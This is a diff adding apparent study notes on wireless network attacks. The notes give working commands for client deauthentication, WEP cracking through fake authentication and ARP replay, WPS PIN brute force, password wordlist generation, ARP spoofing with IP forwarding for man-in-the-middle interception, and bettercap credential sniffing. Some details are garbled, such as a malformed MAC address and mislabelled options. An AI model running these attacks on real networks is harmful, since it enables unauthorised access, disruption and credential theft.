@@ -1,0 +1,202 @@
+Changing the mac address of the wireless adapter
+
+ifconfig wlan0 down
+ifconfig wlan0 hw ether 00:11:22:33:44:55
+ifconfig wlan0 up
+
+To set the mode of the adapter to monitor mode
+
+ifconfig wlan0 down
+airmon-ng check kill
+iwconfig wlan0 mode monitor
+ifconfig wlan0 up
+
+PWR refers to the power of the signal.
+
+airodump-ng wlan0
+
+For 5ghz monitor,
+airodump-ng --band a wlan0
+
+For monitoring both 5Ghz and 2.4Ghz frequencies,
+airodump-ng --band abg wlan0
+
+For reading the data and storing the data in the file,
+airodump-ng --bssid 4C:93:A6:89:4E:4F --channel 149 --write test wlan0
+
+bssid is the mac id of the target wifi network.
+channel is the channel number as viewed in monitor mode
+write is the file in which we want to capture all the data and write it in a file
+
+wireshark command opens wireshark and we can open .cap files in it to view. An open network can be easily read. But in case of encryption, we see
+all gibberish.
+
+We want to get a client thrown out of the network, a very simple thing that we can do is
+aireplay-ng --deauth 10000000 -a $C:93:A6:89:4E:4F -c 0A:BB:E7:D4:F1:61 -D wlan0
+
+The -D is for a 5Ghx wifi in case the client is using it.
+-a is the router mac address
+-c is the client mac address
+
+The first encryption to break is the WEP or the Wired Equivalent Privacy.
+It is an old encryption technique
+Uses an algorithm called RC4
+Still used in some networks
+Can be cracked easily
+
+WEP Cracking
+Each packet is encrypted using a unique key stream
+Random initialization vector(IV) is used to generate key streams
+The initialization vector is only 24 bits!
+IV + Key (password)=Key stream.
+
+WEP Cracking
+Client encrypts data using a key.
+Encryted packet sent in the air.
+Router decrypts packet using the key.
+
+WEP Cracking
+IV is too small(only 24 bits).
+IV is sent in plain text.
+
+Result:
+IV's will repeat on busy netoworks.
+This makes WEP vulnerable to statistical attacks.
+Repeated IVs can be used to determine the key stream.
+And break the encryption
+
+For cracking WEP network data that we collected,
+we first read the data and store it inside a file.
+Then after we have accumulated a huge number of packets
+we can write
+aircrack-ng basic_wep-01.cap
+
+basic_wep-01.cap is the name of the file we are storing the packets into
+
+We then remove the colons from the generated key and then try connecting to the network using the
+key as the password.
+
+Now if the network is not being used often, the data count will not increase rapidly and we will have
+to wait for hours to get it working.
+
+aireplay-ng --fakeauth 0 -a 64:16:F0:EC:7B:F3 -h 48:5D:60:2A:45:25 wlan0
+
+The -a is the bssid of the router that we are willing to crack.
+The -h is the uspec column of the wireless adapter currently in monitor mode.
+We are trying to do the fakeauth attack hence the fakeauth flag
+
+This commands in the auth section specifies it as open.
+We are now just associated with the network, just not authenticated yet.
+
+To run an ARP replay attack we can just use 
+aireplay-ng --arpreplay -b 64:16:F0:EC:7B:F3 -h 48:5D:60:2A:45:25 wlan0
+
+This sends ARP packets continually, forcing the router to generate new packets quite frequently.
+
+WPA / WPA2 Cracking
+
+Both can be cracked using the same methods
+Made to address the issues in WEP
+Much more secure
+Each packet is encrypted using a unique temporary key.
+
+Packets contain no useful information
+
+WPa / WPA2 Cracking
+ARP Request Replay
+
+WPS is a feature that can be used with WPA & WPA2.
+Allows clients to connect without the password.
+Authentication is done using an 8 digit pin.
+	8 Digits is very small
+	We can try all possible pins in relatively short time.
+	Then the WPS pin can be used to compute the actual password.
+PS: This only works if the router is configured not to use PBC(Push Button Authentication).
+
+In case the PBC is not configured, we can use the following technique.
+
+WPA/WPA2 Cracking
+
+Fixed all weaknesses in WEP
+Packets contain no useful data
+Only packets that can aid with the cracking process are the handshake packets
+	These are 4 packets sent when a client connects to the network.
+
+crunch 6 10 obcd1234 -o test.txt
+This generates a huge file containing all the combinations of the password.
+
+crunch 8 8 obcd1234 -o test.txt -t o@@@@@@4
+This will create all combinations according to the given password.
+
+Post Connection Attacks
+
+Discover all devices on the network
+Display their 
+	IP Address
+	MAC Address
+	Operating System
+	Open Ports
+	Running Services
+	etc
+
+Using zenmap, we can scan all the devices present in the same network along with their manufacturer name.
+We can get the ports that are active and then discover exploits based on them.
+
+
+Now an arpspoof attack is to just use the shortcomings of the arp protocol.
+
+The command to fool the client is
+arpspoof -i wlan0 -t 10.0.2.27 10.0.2.1
+
+The command to fool the router is
+arpspoof -i wlan0 -t 10.0.2.1 10.0.2.27
+
+Now the command directly executed will not work since it will not forward requests of the client to the router,
+hence we need to enable port forwarding. This is a linux security feature, hence we need to manually enable it.
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+ARP Spoofing using bettercap
+
+Framework to run network attacks.
+Can be used to
+	ARP Spoof targets (redirect the flow of packets)
+	Sniff data(urls, username passwords).
+	Bypass HTTPS
+	Redirect domain requests(DNS Spoofing).
+	Inject code in loaded pages
+	And more
+
+For using bettercap,
+
+bettercap -iface eth0
+
+we can simply type help to get help about the interface and the commands
+
+we can then switch on net.probe by
+net.probe on
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
